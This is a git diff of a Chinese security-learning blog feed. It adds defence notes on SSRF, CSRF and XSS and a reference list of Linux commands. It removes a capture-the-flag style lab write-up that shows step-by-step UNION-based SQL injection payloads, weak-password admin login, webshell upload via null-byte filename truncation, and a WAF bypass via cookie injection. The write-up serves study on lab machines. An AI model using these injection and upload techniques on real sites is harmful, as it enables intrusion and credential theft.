@@ -455,7 +455,14 @@
 <li>审计信息保存在只能增加不能删除的数据库中</li>
 <li>建立有效的告警机制，使可疑活动在可接受的范围内被发现和应对</li>
 </ol>
-<p>👉🏻TOP10：服务器端请求伪造</p>
+<h3 id="👉🏻TOP10：服务器端请求伪造"><a href="#👉🏻TOP10：服务器端请求伪造" class="headerlink" title="👉🏻TOP10：服务器端请求伪造"></a>👉🏻TOP10：服务器端请求伪造</h3><p>攻击者利用服务器上的应用程序，发送伪造请求到服务器内部或者其他内网，从而达到攻击的目的</p>
+<ol>
+<li>限制访问权限：确保服务器上的应用程序只能访问必要的资源，避免访问敏感的内部网络资源。</li>
+<li>过滤和验证输入： 对用户输入进行有效的过滤和验证，确保输入的URL是合法的且安全的，防止攻击者利用URL参数进行攻击。</li>
+<li>使用白名单： 配置白名单，只允许应用程序访问特定的URL或者IP地址，从而避免访问未经授权的资源。</li>
+<li>使用防火墙和WAF： 配置防火墙和Web应用程序防火墙（WAF），监控和过滤服务器上的入站和出站流量，阻止恶意请求和攻击。</li>
+<li>更新和维护： 定期更新和维护服务器上的软件和组件，修复已知的漏洞和安全问题</li>
+</ol>
 <p><strong>XXE</strong></p>
 <p>应用程序解析XML文件时包含了对外部实体的引用，攻击者传递恶意包含XML代码的文件，读取指定服务器资源</p>
 <p>防范：</p>
@@ -464,6 +471,24 @@
 <li>服务器端实行白名单验证、过滤、清除，防止在XML或者标题中出现恶意数据</li>
 <li>及时更新或者修复应用程序和底层操作系统使用的所有XML处理器和库</li>
 <li></li>
+</ol>
+<h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF-跨站请求伪造"></a>CSRF-跨站请求伪造</h3><p>利用用户在某个网站上已经登录的身份，在用户不知情的情况下，在另一个网站上执行一些非法操作</p>
+<p>已经在购物网站上登录，然后收到一封看起来很正常的电子邮件。点击邮件中的链接，不知不觉地执行了一个操作，比如购买了一件商品或者更改了密码</p>
+<ol>
+<li>在每个表单提交或者敏感操作中包含一个随机生成的Token，并在后端进行验证。这个Token在每次请求中都会发生变化，攻击者无法伪造有效的Token，从而阻止了CSRF攻击。</li>
+<li>限制cookie的发送范围，只允许来自同一站点的请求携带Cookie，防止跨站请求伪造</li>
+<li>服务器端对请求的Referer进行验证，确保请求来源合法</li>
+<li>执行敏感操作的请求，需要用户进行双重确认，比如输入密码、验证码等</li>
+<li>对于执行敏感操作的Session，设置短暂有效期，减少攻击者利用的时间窗口</li>
+<li>使用POST方法而不是GET方法来执行敏感操作</li>
+</ol>
+<h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><p>将可执行的前端脚本代码（一般为JavaScript）植入到网页中，通过利用网页开发时留下的漏洞，注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</p>
+<p>反射型：攻击者将JS代码作为请求参数放置URL中，诱导用户点击，落入陷阱<br>存储型：将攻击脚本入库存储，在后面进行查询时，再将攻击脚本渲染进网页，返回给浏览器触发执行</p>
+<ol>
+<li>输入验证和过滤： 对用户输入的内容进行严格的验证和过滤，确保其中不包含恶意脚本。可以使用白名单过滤、转义特殊字符等方式来防止</li>
+<li>输出编码：使用合适的编码方式编码，防止浏览器误将其中的内容解析为可执行的脚本。常用的编码方式包括HTML编码、URL编码等。</li>
+<li>HTTP头部设置： 在HTTP响应头中设置合适的Content-Security-Policy（CSP）头部，限制页面加载的资源和执行的脚本</li>
+<li>将敏感信息存储在HttpOnly Cookie中，这样即使页面存在XSS漏洞，攻击者也无法窃取到Cookie中的敏感信息。</li>
 </ol>
 ]]></content>
   </entry>
@@ -613,199 +638,328 @@
       </tags>
   </entry>
   <entry>
-    <title>shop靶场&amp;封神台</title>
-    <url>/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h3 id="shop靶场-1"><a href="#shop靶场-1" class="headerlink" title="shop靶场-1"></a><strong>shop靶场-1</strong></h3><p><em>ps：借鉴了一部分其他小伙伴的渗透过程内容(csdn@哈哈哈cry)</em></p>
-<p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
-<p>打开虚拟机后然后双击打开shop1:</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8737.png" class title="This is an test image">
+    <title>常用Linux命令</title>
+    <url>/2024/03/20/%E5%B8%B8%E7%94%A8Linux%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h3 id="常用linux命令"><a href="#常用linux命令" class="headerlink" title="常用linux命令"></a>常用linux命令</h3><p>绝大部分云基础设施和托管服务都在Linux操作系统中运行，所以了解甚至熟知Linux命令是至关重要的</p>
+<p>之前看一个师傅说把电脑刷成Linux机的话对计算机一些底层原理的了解会更深入（我有进行这个尝试的想法hhh，毕竟全命令行操作确实很酷！</p>
+<p>以下是Linux较全的命令收录👇🏻一些常用的不常用但是有一定概率会用到的都有收录</p>
+<p>​        </p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">启动terminal（终端）Ctrl+ Alt +T</span><br></pre></td></tr></table></figure>
 
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8738.png" class title="This is an test image">
-
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8739.png" class title="This is an test image">
-
-<p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8740.png" class title="This is an test image">
-
-<p>点击关闭:</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8741.png" class title="This is an test image">
-
-<p>现在再点击就能打开了，如图：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8742.png" class title="This is an test image">
-
-<p>点击第一行：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8743.png" class title="This is an test image">
-
-<p>输入网站后台的地址：<a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8744.png" class title="This is an test image">
-
-<p>先来试试弱密码：账号：admin 密码：admin</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8745.png" class title="This is an test image">
-
-<p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8746.png" class title="This is an test image">
-
-
-
-
-
-<h3 id="shop靶场-2"><a href="#shop靶场-2" class="headerlink" title="shop靶场-2"></a>shop靶场-2</h3><p>打开过程同“shop靶场-1”</p>
-<p>首先进入后台先要找到后台登录页面，使用工具扫描没有结果，但发现了网站的后台：</p>
-<p><a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
-<p>跳转到网页后台登录页面：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8747.png" class title="This is an test image">
-
-<p>试一试之前试过的弱密码，失败</p>
-<p>接下来进行<strong>sql注入</strong></p>
-<p>打开阿D注入工具</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8748.png" class title="This is an test image">
-
-<p>将注入链接里面的IP地址改成我现在的地址，点击检测</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8749.png" class title="This is an test image">
-
-<p>点击检测标段，再点击admin</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8750.png" class title="This is an test image">
-
-<p>点击检测字段，再把password和admin勾选上</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8751.png" class title="This is an test image">
-
-<p>点击检测内容</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8752.png" class title="This is an test image">
-
-<p>结果出现两组账号密码，我们任选其中一组就行</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8753.png" class title="This is an test image">
-
-<p>在这里，我选择了上面一种，双击，出现账号和密码</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8754.png" class title="This is an test image">
-
-<p>我们发现密码好像被MD5加密过了，解密得</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8755.png" class title="This is an test image">
-
-<p>用获取的账号和密码进行登录</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8756.png" class title="This is an test image">
-
-<p>成功登录</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8757.png" class title="This is an test image">
-
-<p>上传木马</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8758.png" class title="This is an test image">
-
-<p>文件上传成功</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8759.png" class title="This is an test image">
-
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8760.png" class title="This is an test image">
-
-<p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8761.png" class title="This is an test image">
-
-<p>输入保存路径+888.asp打开网页显示木马添加成功</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8762.png" class title="This is an test image">
-
-<p>打开菜刀，将木马路径输入进去</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8763.png" class title="This is an test image">
-
-<p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8764.png" class title="This is an test image">
-
-
-
-<h3 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8765.png" class title="This is an test image">
-
-<p><strong>判断是否存在SQL注入漏洞</strong></p>
-<p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8766.png" class title="This is an test image"> 
-
-<p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
-<p>2.构造 and 1&#x3D;2</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8767.png" class title="This is an test image">
-
-<p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
-<p><strong>判断字段数</strong></p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8768.png" class title="This is an test image">
-
-<p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8769.png" class title="This is an test image">
-
-<p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8770.png" class title="This is an test image">
-
-<p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
-<p><strong>判断回显点</strong></p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8771.png" class title="This is an test image">
-
-<p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
-<p><strong>查询相关内容</strong></p>
-<p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8772.png" class title="This is an test image">
-
-<p>页面回显maoshe</p>
-<p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8773.png" class title="This is an test image">
-
-<p>回显版本号为5.5.53</p>
-<p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8774.png" class title="This is an test image">
-
-<p>页面回显admin</p>
-<p>绝大数情况下，管理员的账号密码都在admin表里。</p>
-<p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8775.png" class title="This is an test image">
-
-<p>回显字段名为id</p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8776.png" class title="This is an test image">
-
-<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8777.png" class title="This is an test image">
-
-<p>回显password</p>
-<p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8778.png" class title="This is an test image">
-
-<p>回显hellohack 得到管理员账号和密码为：hellokack</p>
-<p>得到flag</p>
-<h3 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8779.png" class title="This is an test image">
-
-<p>用御剑进行扫描，flag在二级目录里</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8780.png" class title="This is an test image">
-
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8781.png" class title="This is an test image">
-
-<p>点击链接，得到flag</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8782.png" class title="This is an test image">
+<h4 id="🎞️最常用命令"><a href="#🎞️最常用命令" class="headerlink" title="🎞️最常用命令"></a>🎞️最常用命令</h4><ol>
+<li><p><strong><code>ls</code> – 列出目录内容</strong></p>
+</li>
+<li><p><strong><code>cd</code> – 更改目录</strong></p>
+</li>
+<li><p><strong><code>mkdir</code> – 创建新目录</strong></p>
+</li>
+<li><p><strong><code>rmdir</code> – 删除目录</strong></p>
+</li>
+<li><p><strong><code>touch</code> – 创建新的空文件</strong></p>
+</li>
+<li><p><strong><code>cp</code> – 复制文件和目录</strong></p>
+</li>
+<li><p><strong><code>mv</code> – 移动或重命名文件和目录</strong></p>
+</li>
+<li><p><strong><code>rm</code> – 移除文件和目录</strong></p>
+</li>
+<li><p><strong><code>find</code></strong> <strong>– 在目录层次结构中搜索文件</strong></p>
+</li>
+<li><p><strong><code>du</code></strong> <strong>– 估算文件空间使用情况</strong></p>
+</li>
+<li><p><strong><code>grep</code></strong> <strong>命令 – 使用条件匹配搜索文本</strong></p>
+</li>
+<li><p><strong><code>awk</code></strong> <strong>– 条件扫描和处理语言</strong></p>
+</li>
+<li><p><strong><code>sed</code></strong> <strong>– 用于过滤和转换文本的流编辑器</strong></p>
+</li>
+<li><p><strong><code>sort</code></strong> <strong>– 对文本文件行进行排序</strong></p>
+</li>
+<li><p><strong><code>uniq</code></strong> <strong>– 报告或省略重复行</strong></p>
+</li>
+<li><p><strong><code>diff</code></strong> <strong>– 逐行比较文件</strong></p>
+</li>
+<li><p><strong><code>wc</code></strong> <strong>– 打印行数、字数和字节数</strong></p>
+</li>
+<li><p><strong><code>&gt;</code></strong> <strong>– 重定向标准输出</strong></p>
+<p>重定向标准输出有助于将命令结果保存到文件中，以便存储、调试或将命令串联起来</p>
+</li>
+<li><p><strong><code>&gt;&gt;</code></strong> <strong>– 追加标准输出</strong></p>
+<p><code>&gt;&gt;</code> 操作符将命令的标准输出追加到文件中，而不覆盖现有内容</p>
+</li>
+<li><p><strong><code>&lt;</code></strong> <strong>– 重定向标准输入</strong></p>
+<p><code>&lt;</code> 重定向操作符将文件内容作为标准输入送入命令，而不是从键盘输入</p>
+</li>
+<li><p><strong><code>|</code></strong> <strong>– 管道输出到另一条命令</strong></p>
+<p>管道 <code>|</code> 操作符将一条命令的输出作为输入发送到另一条命令，将它们串联起来</p>
+<p>管道通常用于将命令串联起来，其中一个命令的输出为另一个命令的输入提供信息。这样就能从较小的单用途程序中构建出复杂的操作</p>
+</li>
+<li><p><strong><code>tee</code></strong> <strong>– 从标准输入读取并写入标准输出和文件</strong></p>
+<p><code>tee</code> 命令将标准输入分为两个流</p>
+<p>它将输入写入标准输出（显示主命令的输出），同时将副本保存到文件中</p>
+<h4 id="🎞️Linux归档命令"><a href="#🎞️Linux归档命令" class="headerlink" title="🎞️Linux归档命令"></a>🎞️Linux归档命令</h4></li>
+<li><p><strong><code>tar</code></strong> <strong>– 从归档文件中存储和提取文件</strong></p>
+<p><code>tar</code> 命令可帮助你处理磁带归档文件（.tar）。它可以帮助你将多个文件和目录捆绑到一个压缩的 .tar 文件中</p>
+</li>
+<li><p><strong><code>gzip</code></strong> <strong>– 压缩或扩展文件</strong></p>
+<p>gzip 命令使用 LZ77 编码压缩文件，以减小存储或传输文件的大小。使用 gzip，你可以处理 .gz 文件</p>
+</li>
+<li><p><strong><code>gunzip</code></strong> <strong>– 解压缩文件</strong></p>
+<p><code>gunzip</code> 命令用于解压缩 .gz 文件</p>
+</li>
+<li><p><strong><code>zip</code></strong> <strong>– 打包和压缩文件</strong></p>
+<p><code>zip</code> 命令用于创建包含压缩文件内容的 .zip 归档文件</p>
+</li>
+<li><p><strong><code>unzip</code></strong> <strong>– 从 ZIP 档案中提取文件</strong></p>
+<p>与 <code>gunzip</code> 类似， <code>unzip</code> 命令可从 .zip 压缩文件中提取和解压缩文件</p>
+<h4 id="Linux文件传输命令"><a href="#Linux文件传输命令" class="headerlink" title="Linux文件传输命令"></a>Linux文件传输命令</h4></li>
+<li><p><strong><code>scp</code></strong> <strong>– 在主机间安全复制文件</strong></p>
+<p><code>scp</code> （安全复制）命令通过 SSH 连接在主机间复制文件。所有数据传输都经过加密，以确保安全</p>
+<h4 id="更多Linux命令"><a href="#更多Linux命令" class="headerlink" title="更多Linux命令"></a>更多Linux命令</h4></li>
+<li><p><strong><code>mount</code></strong> – 将硬盘安装或 “连接 “到系统上</p>
+</li>
+<li><p><strong><code>umount</code></strong> – 从系统中卸载或 “移除” 硬盘。 </p>
+</li>
+<li><p>**<code>xargs </code>**– 生成并执行通过标准输入提供的命令。</p>
+</li>
+<li><p><strong><code>alias</code></strong> – 为冗长或复杂的命令创建快捷方式</p>
+</li>
+<li><p><strong><code>jobs</code> – 列出当前在后台运行任务的程序</strong></p>
+</li>
+<li><p><strong><code>bg</code> – 恢复已停止或暂停的后台进程</strong></p>
+</li>
+<li><p><strong><code>killall</code> – 通过程序名称而不是 PID 终止进程</strong></p>
+</li>
+<li><p><strong><code>history</code> – 显示当前终端会话中以前使用过的命令</strong></p>
+</li>
+<li><p><strong><code>man</code> – 直接在终端中访问命令的帮助手册</strong></p>
+</li>
+<li><p><strong><code>screen</code> – 从一个窗口管理多个终端会话。</strong></p>
+</li>
+<li><p><strong><code>ssh</code> – 建立与远程服务器的安全加密连接</strong></p>
+</li>
+<li><p><strong><code>tcpdump</code> – 根据特定标准捕获网络流量</strong></p>
+</li>
+<li><p><strong><code>watch</code> – 每隔一段时间重复一次命令，并突出显示输出差异</strong></p>
+</li>
+<li><p><strong><code>nc</code> – 打开 TCP 或 UDP 连接，进行测试和数据传输</strong></p>
+</li>
+<li><p><strong><code>nmap</code> – 主机发现、端口扫描和操作系统指纹</strong></p>
+</li>
+<li><p><strong><code>strace</code> – 通过跟踪操作系统信号和调用来调试进程</strong></p>
+</li>
+<li><p><strong><code>unalias</code>– 顾名思义，<code>unalias</code>命令旨在从已定义的别名中删除<code>alias</code></strong></p>
+</li>
+<li><p><strong><code>pwd</code>– 代表“打印工作目录”，它输出您所在目录的绝对路径</strong></p>
+</li>
+<li><p><strong><code>./</code> – .&#x2F; 符号本身不是命令，但在这个列表中值得一提。</strong><br>它允许shell直接从终端运行可执行文件，并在系统中安装任何解释器</p>
+</li>
+<li><p><strong><code>exit</code>– 自动关闭正在使用的终端</strong></p>
+</li>
+<li><p><strong><code>apt</code>, <code>yum</code>, <code>pacman</code> 命令</strong><br>无论使用的是哪个Linux发行版，都可能使用package管理器来安装、更新和删除每天使用的软件</p>
+<p><strong>1. Debian-based (Ubuntu, Linux Mint)</strong></p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt install gimp</span><br></pre></td></tr></table></figure>
 
 
+<p><strong>2. Red Hat-based (Fedora, CentOS)</strong></p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo yum install gimp</span><br></pre></td></tr></table></figure>
 
 
-
-<h3 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8783.png" class title="This is an test image">
-
-<p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入</p>
-<p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字</p>
-<p>因为网页做了waf过滤防护，这里考虑用cookie注入，可以进行绕过</p>
-<p>这里使用一个小工具进行注入</p>
-<p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8784.png" class title="This is an test image">
-
-<p>出现账号和密码</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8785.png" class title="This is an test image">
-
-<p>将密码md5解密</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8786.png" class title="This is an test image">
-
-<p>用御剑进行扫描，获得后台地址：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8787.png" class title="This is an test image">
-
-<p>输入之前获得的用户名和密码</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8788.png" class title="This is an test image">
-
-<p>成功拿到flag</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8789.png" class title="This is an test image">
+<p><strong>3. Arch-based (Manjaro, Arco Linux)</strong></p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gimp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>echo</code>– 在终端中显示定义的文本</strong></p>
+</li>
+<li><p><strong><code>cat</code>– 用于直接从终端创建、查看和连接文件。</strong></p>
+<p><strong><code>cat</code></strong> 是“concatenate”的缩写，用于直接从终端创建、查看和连接文件。它主要用于在不打开图形文本编辑器的情况下预览文件</p>
+</li>
+<li><p><strong><code>vim</code>– 使用高效的键绑定编辑纯文本文件</strong></p>
+</li>
+<li><p><strong><code>which</code>– 输出shell命令的完整路径。</strong><br><code>which</code>命令输出shell命令的完整路径</p>
+</li>
+<li><p><strong><code>shred</code>– 此命令会重复覆盖文件的内容。</strong><br>此命令会重复覆盖文件的内容，给定的文件极难恢复</p>
+</li>
+<li><p><strong><code>tail</code>– 打印文件内容后几行</strong></p>
+</li>
+<li><p><strong><code>head</code>– 输出文本文件的前10行</strong></p>
+</li>
+<li><p><strong><code>whatis</code>– 打印任何其他命令的说明</strong></p>
+</li>
+<li><p><strong><code>neofetch</code>– CLI（命令行界面）工具。</strong><br>Neofetch是一个CLI（命令行界面）工具，它在Linux发行版的ASCII徽标旁边显示有关系统的信息，如内核版本、shell和硬件</p>
+</li>
+<li></li>
+<li><p><strong><code>less</code>– 允许您前后检查文件的程序</strong></p>
+</li>
+<li><p><strong><code>tmux</code> – 用于持续会话和分割的终端多路复用器</strong></p>
+</li>
+</ol>
+<h4 id="速查常用Linux命令"><a href="#速查常用Linux命令" class="headerlink" title="速查常用Linux命令"></a>速查常用Linux命令</h4><table>
+<thead>
+<tr>
+<th>ls</th>
+<th>列出目录的内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>alias</td>
+<td>定义或显示别名</td>
+</tr>
+<tr>
+<td>unalias</td>
+<td>删除别名定义</td>
+</tr>
+<tr>
+<td>pwd</td>
+<td>打印工作目录</td>
+</tr>
+<tr>
+<td>cd</td>
+<td>更改目录</td>
+</tr>
+<tr>
+<td>cp</td>
+<td>复制文件和目录</td>
+</tr>
+<tr>
+<td>rm</td>
+<td>删除文件和目录</td>
+</tr>
+<tr>
+<td>mv</td>
+<td>移动（重命名）文件和目录</td>
+</tr>
+<tr>
+<td>mkdir</td>
+<td>创建目录</td>
+</tr>
+<tr>
+<td>man</td>
+<td>显示其他命令的手册页面</td>
+</tr>
+<tr>
+<td>touch</td>
+<td>创建空文件</td>
+</tr>
+<tr>
+<td>chmod</td>
+<td>更改文件权限</td>
+</tr>
+<tr>
+<td>.&#x2F;</td>
+<td>运行可执行文件</td>
+</tr>
+<tr>
+<td>exit</td>
+<td>退出当前shell会话</td>
+</tr>
+<tr>
+<td>sudo</td>
+<td>以超级用户身份执行命令</td>
+</tr>
+<tr>
+<td>shutdown</td>
+<td>关闭您的机器</td>
+</tr>
+<tr>
+<td>htop</td>
+<td>显示进程和资源信息</td>
+</tr>
+<tr>
+<td>unzip</td>
+<td>解压zip文件</td>
+</tr>
+<tr>
+<td>apt,yum,pacman</td>
+<td>包管理器</td>
+</tr>
+<tr>
+<td>echo</td>
+<td>显示文本行</td>
+</tr>
+<tr>
+<td>cat</td>
+<td>打印文件内容</td>
+</tr>
+<tr>
+<td>ps</td>
+<td>报告shell进程状态</td>
+</tr>
+<tr>
+<td>kill</td>
+<td>终止程序</td>
+</tr>
+<tr>
+<td>ping</td>
+<td>测试网络连接</td>
+</tr>
+<tr>
+<td>vim</td>
+<td>高效文本编辑</td>
+</tr>
+<tr>
+<td>history</td>
+<td>显示以前的命令列表</td>
+</tr>
+<tr>
+<td>passwd</td>
+<td>更改用户密码</td>
+</tr>
+<tr>
+<td>which</td>
